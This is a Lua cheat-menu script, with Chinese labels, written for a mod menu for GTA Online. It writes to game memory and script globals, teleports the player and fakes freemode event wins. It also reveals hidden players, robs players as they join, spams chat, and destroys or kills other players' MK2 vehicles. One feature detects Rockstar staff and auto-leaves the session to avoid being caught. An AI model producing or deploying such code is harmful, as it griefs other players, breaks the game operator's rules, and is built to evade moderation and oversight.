menu.toggle_loop(convenient, "加入战局时向玩家抢劫", {}, "", function ()
    CheckLobbyForPlayers()
end)
player_count = menu.action(convenient, "战局里有" .. get_player_count() .. "位吊毛", {}, "", function()
    util.toast("战局里有" .. get_player_count() .. "位吊毛")
end)
local function update_player_count()
    menu.set_menu_name(player_count, get_player_count() .. "玩家")
end
local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
local freemodelist = menu.list(online, "自由模式活动", {}, "")
menu.action(freemodelist, "赢得刑事毁坏", {}, "每次都能赢得刑事毁坏", function()
    local cartable = {}

    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local defz = c.z 
    STREAMING.REQUEST_MODEL(expcar)
    while not STREAMING.HAS_MODEL_LOADED(expcar) do
        STREAMING.REQUEST_MODEL(expcar)
        util.yield()
    end
    STREAMING.REQUEST_MODEL(floorbr)
    while not STREAMING.HAS_MODEL_LOADED(floorbr) do
        STREAMING.REQUEST_MODEL(floorbr)
        util.yield()
    end
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(c.x, c.y)
        util.yield()
    until success
    floorcoords = floorcoords - 100
    c.z = floorcoords
    local floorrig = entities.create_object(floorbr, c) --spawn floor
    c.z = defz
    c.z = c.z - 95
    for i = 1, 22 do
        cartable[#cartable + 1] = entities.create_vehicle(expcar, c, 0) --spawn cars
    end
    util.yield(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, floorcoords, exp, 100.0, false, false, 0.0) --explode cars
    util.yield(500)
    entities.delete_by_handle(floorrig)
    util.yield(1000)

    for i = 1, #cartable do
        entities.delete_by_handle(cartable[i]) --delete cars
        cartable[i] = nil
    end
end)

menu.toggle_loop(freemodelist, "赢得检查点", {}, "撞点活动", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
    local cdblip = HUD.GET_BLIP_COORDS(dblip)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
    util.yield(1500)
end)
local colouredotr = menu.list(online, '标记人间蒸发玩家', {}, '')

    menu.toggle_loop(colouredotr, '标记人间蒸发玩家', {'JScolouredOtrReveal'}, '光点标记.', function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if players.is_otr(pid) and not markedPlayers[pid] then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                markedPlayers[pid] = HUD.ADD_BLIP_FOR_ENTITY(ped)
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
                HUD.SHOW_HEADING_INDICATOR_ON_BLIP(markedPlayers[pid], true)
            elseif players.is_otr(pid) then
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
            elseif not players.is_otr(pid) and markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end, function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end)

    local otr_colour_slider = menu.slider(colouredotr, '标记颜色', {'JSortRevealColour'}, '',1, 81, otrBlipColour, 1, function(value)
        otrBlipColour = value + (value > 71 and 1 or 0) + (value > 77 and 2 or 0)
    end)

    menu.toggle_loop(colouredotr, '逐渐递增颜色数值', {'JSortRgbReveal'}, '', function()
        menu.set_value(otr_colour_slider, (otrBlipColour == 84 and 1 or otrBlipColour + 1))
        util.yield(250)
    end)
menu.divider(online, "聊天选项")
TRANROOT = menu.list(online, "战局聊天翻译", {}, "", function(); end)
chat1 = menu.list(online, "战局宣布", {}, "", function(); end)
  menu.action(chat1,"CqCqscript No.1", {},"",function()
	local cqcq1 = "CqCqscript No.1"
    local cqcq2 = "CqCqscript No.1"
    local cqcq3 = "CqCqscript No.1"
    local cqcq4 = "CqCqscript No.1"
	chat.send_message(cqcq1, false, true, true)
	util.yield(5000)
	chat.send_message(cqcq2, false, true, true)
	util.yield(2000)
	chat.send_message(cqcq3, false, true, true)
	util.yield(7000)
	chat.send_message(cqcq4, false, true, true)
	util.yield(1000)
	end)
    menu.action(chat1, "虚假黑客", {}, "发出一个本地化的假黑入百分比条", function(click_type)
        hackchat()
    end)
    menu.action(chat1, "随机笑话", {"randomjoke"}, "随便讲个笑话。", function(click_type)
        suijixiaohua()
    end)
    menu.toggle(chat1, "性行为", {}, "宣布性行为的发生", function(toggled)--===========jinx========thanks
        xuanbuxingxingwei(toggled)
    end)
    menu.toggle_loop(chat1, "随机笑话循环", {"randomjokeloop"}, "讲一个随机笑话，五秒循环一次", function(click_type)
        loopsuijixiaohua()
    end)
    menu.action(chat1,"清屏", {},"",function()
        for i = 1, 100 do
        local ret = "  "
            chat.send_message(ret, false, true, true)
        end
        end)
  if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
    memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
    memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
else
end
menu.divider(vehicle,"载具功能")
local jesus_main = menu.list(vehicle, "自动驾驶", {}, "需设置导航点（感谢jinx）")
menu.slider_text(jesus_main, "驾驶风格", {}, "单击以选择样式", style_names, function(index, value)
    pluto_switch value do
        case "正常":
            style = 786603
            break
        case "冲刺":
            style = 1074528293
            break
        case "半冲刺":
            style = 8388614
            break
        case "反向":
            style = 1076
            break
        case "无视红绿灯":
            style = 2883621
            break
        case "避开交通":
            style = 786603
            break
        case "极度避开交通":
            style = 6
            break
        case "有时超车":
            style = 5
            break
        end
    end)
jesus_toggle = menu.toggle(jesus_main, "启用", {}, "", function(toggled)
    if toggled then
        local player = players.user_ped()
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local player_veh = entities.get_user_vehicle_as_handle()

        if not PED.IS_PED_IN_ANY_VEHICLE(player, false) then 
            util.toast("请先上载具 谢谢")
        return end
        local function request_model(hash, timeout)
            timeout = timeout or 3
            STREAMING.REQUEST_MODEL(hash)
            local end_time = os.time() + timeout
            repeat
                util.yield()
            until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
            return STREAMING.HAS_MODEL_LOADED(hash)
        end
        local jesus = util.joaat("u_m_m_jewelsec_01")
        request_model(jesus)

        
        jesus_ped = entities.create_ped(26, jesus, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
        PED.SET_PED_INTO_VEHICLE(player, player_veh, -2)
        PED.SET_PED_INTO_VEHICLE(jesus_ped, player_veh, -1)
        PED.SET_PED_KEEP_TASK(jesus_ped, true)

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, player_veh, pos.x, pos.y, pos.z, 9999, style, 0)
        else
            util.toast("需要设置导航点")
                menu.set_value(jesus_toggle, false)
        end
    else
        if jesus_ped ~= nil then 
            entities.delete_by_handle(jesus_ped)
        end
    end
end)
local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
menu.toggle(vehicle, "特斯拉自动驾驶(随缘跑)", {}, "不要设置导航点！！！！（会报错）感谢jinx", function(toggled)--========感谢jinx
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
	    	local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)
local interiors = {
    {"安全空间 [挂机室]", {x=-158.71494, y=-982.75885, z=149.13135}},
    {"酷刑室", {x=147.170, y=-2201.804, z=4.688}},
    {"矿道", {x=-595.48505, y=2086.4502, z=131.38136}},
    {"欧米茄车库", {x=2330.2573, y=2572.3005, z=46.679367}},
    {"末日任务服务器组", {x=2474.0847, y=-332.58887, z=92.9927}},
    {"角色捏脸房间", {x=402.91586, y=-998.5701, z=-99.004074}},
    {"Lifeinvader大楼", {x=-1082.8595, y=-254.774, z=37.763317}},
    {"竞速结束车库", {x=405.9228, y=-954.1149, z=-99.6627}},
    {"被摧毁的医院", {x=304.03894, y=-590.3037, z=43.291893}},
    {"体育场", {x=-256.92334, y=-2024.9717, z=30.145584}},
    {"Split Sides喜剧俱乐部", {x=-430.00974, y=261.3437, z=83.00648}},
    {"巴哈马酒吧", {x=-1394.8816, y=-599.7526, z=30.319544}},
    {"看门人之家", {x=-110.20285, y=-8.6156025, z=70.51957}},
    {"费蓝德医生之家", {x=-1913.8342, y=-574.5799, z=11.435149}},
    {"杜根房子", {x=1395.2512, y=1141.6833, z=114.63437}},
    {"弗洛伊德公寓", {x=-1156.5099, y=-1519.0894, z=10.632717}},
    {"麦克家", {x=-813.8814, y=179.07889, z=72.15914}},
    {"富兰克林家（旧）", {x=-14.239959, y=-1439.6913, z=31.101551}},
    {"富兰克林家（新）", {x=7.3125067, y=537.3615, z=176.02803}},
    {"崔佛家", {x=1974.1617, y=3819.032, z=33.436287}},
    {"莱斯斯家", {x=1273.898, y=-1719.304, z=54.771}},
    {"莱斯特的纺织厂", {x=713.5684, y=-963.64795, z=30.39534}},
    {"莱斯特的纺织厂办事处", {x=707.2138, y=-965.5549, z=30.412853}},
    {"甲基安非他明实验室", {x=1391.773, y=3608.716, z=38.942}},
    {"人道实验室", {x=3625.743, y=3743.653, z=28.69009}},
    {"汽车旅馆客房", {x=152.2605, y=-1004.471, z=-99.024}},
    {"警察局", {x=443.4068, y=-983.256, z=30.689589}},
    {"太平洋标准银行金库", {x=263.39627, y=214.39891, z=101.68336}},
    {"布莱恩郡银行", {x=-109.77874, y=6464.8945, z=31.626724}}, -- credit to fluidware for telling me about this one
    {"龙舌兰酒吧", {x=-564.4645, y=275.5777, z=83.074585}},
    {"废料厂车库", {x=485.46396, y=-1315.0614, z=29.2141}},
    {"失落摩托帮", {x=980.8098, y=-101.96038, z=74.84504}},
    {"范吉利科珠宝店", {x=-629.9367, y=-236.41296, z=38.057056}},
    {"机场休息室", {x=-913.8656, y=-2527.106, z=36.331566}},
    {"停尸房", {x=240.94368, y=-1379.0645, z=33.74177}},
    {"联盟保存处", {x=1.298771, y=-700.96967, z=16.131021}},
    {"军事基地瞭望塔", {x=-2357.9187, y=3249.689, z=101.45073}},
    {"事务所内部", {x=-1118.0181, y=-77.93254, z=-98.99977}},
    {"中介所车库", {x=-1071.0494, y=-71.898506, z=-94.59982}},
    {"复仇者内部", {x=518.6444, y=4750.4644, z=-69.3235}},
    {"恐霸内部", {x=-1421.015, y=-3012.587, z=-80.000}},
    {"地堡内部", {x=899.5518,y=-3246.038, z=-98.04907}},
    {"IAA 办公室", {x=128.20, y=-617.39, z=206.04}},
    {"FIB 顶层", {x=135.94359, y=-749.4102, z=258.152}},
    {"FIB 47层", {x=134.5835, y=-766.486, z=234.152}},
    {"FIB 49层", {x=134.635, y=-765.831, z=242.152}},
    {"大公鸡", {x=-31.007448, y=6317.047, z=40.04039}},
    {"大麻商店", {x=-1170.3048, y=-1570.8246, z=4.663622}},
    {"脱衣舞俱乐部DJ位置", {x=121.398254, y=-1281.0024, z=29.480522}},
}
for index, data in pairs(interiors) do
    local location_name = data[1]
    local location_coords = data[2]
    menu.action(chuansong, location_name, {}, "", function()
        menu.trigger_commands("doors on")
        menu.trigger_commands("nodeathbarriers on")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), location_coords.x, location_coords.y, location_coords.z, false, false, false)
    end)
end
menu.toggle(vehicle, "免于事故", {"accidentavoidance"}, "", function(on)
    if on then
        noaccident = true
        tesila()
    else
        noaccident = false
    end
end)
menu.toggle_loop(vehicle, "车辆干扰", {"forcecms"}, "按e键可使车辆产生干扰弹", function(on)
    clgr()
end)
menu.toggle(vehicle, "车辆最大变形", {}, "载具不能是无敌的\n关闭载具修复功能", function(toggled)
    if toggled then
        menu.trigger_commands("vhdeformationmult 10000.0")
    else
        menu.trigger_commands("vhdeformationmult 1.00")
    end
end)
local last_vehicle_with_radio_off = 0
menu.toggle_loop(vehicle, "自动关闭收音机", {}, "每次上车时关闭收音机.",
function()
    zdgbsyj()
end)
menu.toggle_loop(vehicle, "自动翻转车辆", {}, "如果你上下颠倒或侧身着地，自动翻转你的车.", function()
    zidongfanzhuan()
end)
renderscorched = false
menu.toggle(vehicle, "载具飞行模式", {"vehfly"}, "自由控制你的载具再天上飞行。", function(on_click)
    is_vehicle_flying = on_click
end)
menu.toggle_loop(vehicle, "翘头起步", {}, "按Ctrl键和W键进行转盘操作.", function(toggled)
    Tanshe(toggled)
end)

    


menu.toggle_loop(vehicle, "变幻莫测", {}, "", function()
    bianhuanmoce()
end)
menu.toggle(vehicle, "无碰撞", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)
veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
util.create_tick_handler(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(veh, true, TRUE); end
    return true
end)
util.on_stop(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
	ENTITY.SET_ENTITY_COLLISION(veh, true, TRUE);
end)
local Vehicle_speed = menu.list(vehicle, "改变载具速度方式", {}, "改变载具速度方式")
menu.text_input(Vehicle_speed, "改变车辆速度", {"vehiclespeed"}, "改变汽车行驶的速度,0=默认值",
    function(string)
        gaibianchesu(string) 
end)
VehicleSpeed = menu.list(Vehicle_speed, "调试模式", {}, "加载调试模式", function(); end)
Load_VehicleSpeed = menu.action(VehicleSpeed, "加载调试模式选项", {""}, "", function()
        notification("正在加载调试模式脚本,请稍等",colors.red)
        util.yield(2000)
        require "lib.cqcqlib.VehicleSpeed"
        menu.delete(Load_VehicleSpeed)
    end)
    local seat_id = -1
local moved_seat = menu.click_slider(vehicle, "快捷更换座位", {}, "", 1, 1, 1, 1, function(seat_id)
    huanzuo(seat_id)
end)
menu.on_tick_in_viewport(moved_seat, function()
    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end

    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end
    
    moved_seat.max_value = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(entities.get_user_vehicle_as_handle()))
end)
menu.divider(vehicle,"其他功能")
jingche = menu.list(vehicle, "警车选项", {}, "加载警车", function(); end)
    jiazaijingche = menu.action(jingche, "加载警车选项", {""}, "", function()
        notification("正在加载警车脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.jingche"
        menu.delete(jiazaijingche)
    end)
    local carcolor = menu.list(vehicle, '载具变色', {}, '')
menu.toggle_loop(carcolor, '变色载具', {}, '可使车辆变色', function ()
    zjbs()
end)
menu.slider(carcolor, '变色速度', {''}, '改变变色速度', 1, 1000, 100, 10, function (c)
    colorspeed(c)
end)
menu.toggle_loop(carcolor, '前照灯', {}, '改变前灯', function ()
    qzd()
end)
menu.slider(carcolor, '前照灯速度', {''}, '前照灯速度', 1, 1000, 100, 10, function (c)
    qzdcolorspeed(c)
end)
HornSongsCq = menu.list(vehicle, "载具音乐", {}, "加载载具音乐", function(); end)
Load_HornSongs = menu.action(HornSongsCq, "加载载具音乐选项", {""}, "", function()
        notification("正在加载载具音乐脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.HornSongs"
        menu.delete(Load_HornSongs)
    end)
ScVehicle = menu.list(vehicle, "生成载具", {}, "加载生成载具", function(); end)
Load_ScVehicle = menu.action(ScVehicle, "加载生成载具选项", {""}, "", function()
        notification("正在加载生成载具脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.CreateVehicle"
        menu.delete(Load_ScVehicle)
    end)
Xuebicar = menu.list(vehicle, "雪碧车项", {}, "", function(); end)
    Load_Xuebicar = menu.action(Xuebicar, "加载雪碧车选项", {""}, "", function()
        notification("正在加载雪碧车脚本,请稍等",colors.green)
        util.yield(2000)
        require "lib.cqcqlib.Xuebiscript"
        menu.delete(Load_Xuebicar)
    end)
chechuang = menu.list(vehicle, "控制车窗", {}, "", function(); end)
    menu.divider(chechuang, "车辆车窗选项")
    
ROLL_DOWN_INDIVIDUAL = menu.list(chechuang, "摇下单个车窗")
    for k, v in pairs(windows) do
        menu.action(ROLL_DOWN_INDIVIDUAL, "往下摇 " .. v.name .. " 窗户", {}, "往下摇 " .. v.name .. "窗户", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, v.number)
        end)
    end
ROLL_UP_INDIVIDUAL = menu.list(chechuang, "摇起单个车窗")
    for k, v in pairs(windows) do
        menu.action(ROLL_UP_INDIVIDUAL, "往上摇 " .. v.name .. "窗户", {}, "往上摇 " .. v.name .. "窗户", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
        end)
    end

menu.action(chechuang, "全部摇下去", {"pwcalldown"}, "将当前车辆的所有车窗都摇下去", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOWS(currentVehicle)
end)
menu.action(chechuang, "全部摇上来", {"pwcallup"}, "摇起当前车辆的所有车窗", function()
    for k, v in pairs(windows) do
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
    end
end)

menu.action(chechuang, "降下前车窗", {"pwcfrontdown"}, "摇下去左前/右前车窗", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 0)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 1)
end)
menu.action(chechuang, "降下后车窗", {"pwcreardown"}, "摇下去左后/右后车窗", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 2)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 3)
end)



ff9car = menu.list(vehicle, "道奇战马", {}, "生成道奇战马")

Spawn = menu.toggle_loop(ff9car, '道奇战马', {'FF9Wspawn'}, '生成带有两种功能的道奇战马', function ()
    daoqizhanma()
end)

mk2 = menu.list(vehicle, "去你的mk2", {}, "", function(); end)
menu.toggle(mk2, "激活报应", { "mk2KarmaBool" },
    "自动删除附近马克兔用户载具.",
    function(on)
        if on then
            oppressorKarma = true
            oppKarma()
        else
            oppressorKarma = false
        end
    end)
menu.toggle(mk2, "目标朋友", { "mk2TargetFriendsBool" },
"这也将针对你的朋友.",
function(on)
    if on then
        oppressorFriendKarma = true
    else
        oppressorFriendKarma = false
    end
end)

    menu.toggle(mk2, "目标你自己", { "mk2TargetYourselfBool" },
    "这也将针对你自己.",
    function(on)
        if on then
            oppressorYourselfKarma = true
        else
            oppressorYourselfKarma = false
        end
    end)
local optionsMK2Karma <const> = { { "[删除]" }, { "[击杀]" }, { "[删除+击杀]" }, { "[删除+发短信]" } }
menu.list_select(mk2, "马克兔报应", {}, "去他妈的马克兔",
    optionsMK2Karma, 1, function(opt)
    local gm <const> = { "[Remove]", "[Kill]", "[Remove + Kill]", "[Remove + Send SMS]" }
    selectedKarmaMK2 = gm[opt]
end)
get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["偏航倍增"] = 0x18, 
    ["偏航稳定"] = 0x20, 
    ["侧面滑动倍增"] = 0x24, 
    ["轻微稳定"] = 0x30, 
    ["攻击提升倍数"] = 0x48, 
    ["下降"] = 0x4C, 
    ["消除抖动"] = 0x58, 
    ["俯仰稳定"] = 0x3C 
}
helicopter = menu.list(vehicle, "稳定直升机", {}, "", function(); end)
menu.slider_float(helicopter, "推力", {"heliThrust"}, "设置直升机推力", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("先乘坐直升机失败")
    end
end)
menu.action(helicopter, "更好的直升机模式", {"betterheli"}, "禁用直升机自动稳定\n这是基于每架直升机（也适用于任何其他具有垂直飞行能力的飞行器）", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("完成\n尝试不崩溃")
    else
        util.toast("先乘坐直升机失败")
    end
end) 
    Load_Undefined = menu.action(Undefined, "加载CqCqscript2.0", {""}, "", function()
        notification("正在加载CqCqscript2.0,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.Undefined"
        menu.delete(Load_Undefined)
    end)
    Load_Fight = menu.action(Fight_script, "加载CqCqscript3.0", {""}, "", function()
        notification("正在加载CqCqscript3.0,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.Fightscript"
        menu.delete(Load_Fight)
    end)
menu.divider(all, "防护类型")
protex = menu.list(all, "防护选项", {}, "", function(); end)
	
	menu.action(protex, "强制停止所有声音", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)
    local admin_bail = true
    menu.toggle(protex, "R*工作人员检测", {"rxjiance"}, "", function(on)
        admin_bail = on
        while admin_bail do
            if util.is_session_started() then
                for _, pid in players.list(false, true, true) do 
                    if players.is_marked_as_admin(pid) then 
                        notify("R*工作人员来了，我已经帮你跑路了.")
                        menu.trigger_commands("quickbail")
                    end    
                end
            end
            util.yield()
        end
    end, true)
    local pool_limiter = menu.list(protex, "实体池限制", {}, "")
    
    menu.slider(pool_limiter, "Ped池限制", {"pedslimit"}, "默认为175", 0, 256, 175, 1, function(amount)
        ped_limit = amount
    end)
    
    menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "默认为150", 0, 300, 150, 1, function(amount)
        veh_limit = amount
    end)
    
    menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "默认为500", 0, 2300, 500, 1, function(amount)
        obj_limit = amount
    end)
    
    menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "默认为25", 0, 50, 25, 1, function(amount)
        projectile_limit = amount
    end)
    
menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
        local ped_count = 0
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            if ped ~= players.user_ped() then
                ped_count += 1
            end
            if ped_count >= ped_limit then
                for _, ped in pairs(entities.get_all_peds_as_handles()) do
                    entities.delete_by_handle(ped)
                end
                notification("Ped池达到上限,正在清理...",colors.green)
            end
        end
        local veh__count = 0
        for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
            veh__count += 1
            if veh__count >= veh_limit then
                for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                    entities.delete_by_handle(veh)
                end
                util.toast("载具池达到上限,正在清理...",colors.green)
            end
        end
        local obj_count = 0
        for _, obj in pairs(entities.get_all_objects_as_handles()) do
            obj_count += 1
            if obj_count >= obj_limit then
                for _, obj in pairs(entities.get_all_objects_as_handles()) do
                    entities.delete_by_handle(obj)
                end
                util.toast("物体池达到上限,正在清理...",colors.green)
            end
        end
    end)
    throttler = menu.list(protex, "自动节流器", {}, "")

    require "lib.cqcqlib.cqcqjieliuqi"
	
    local cleanlist = menu.list(protex, "清除选项", {}, "")
    menu.action(cleanlist, "超级清", {"清除区域"}, "清除一切", function(on_click)
		local ct = 0
		notification("还你世界一片清净", colors.black)
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("已删掉所有东西")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end

	end)
	menu.click_slider(cleanlist,"清理实体", {""}, "1 = NPC, 2 = 载具, 3 = 实体, 4 = 拾取物, 5 =所有", 1, 5, 1, 1, function(on_change)
		if on_change == 1 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "NPC清除完成", colors.green)
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "载具清除完成", colors.green)
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "实体已清除", colors.green)
			return
		end
		if on_change == 4 then
			local count = 0
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " pickups have been yeeted", colors.green)
			return
		end
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "清理完成", colors.green)
			return
		end
	end)
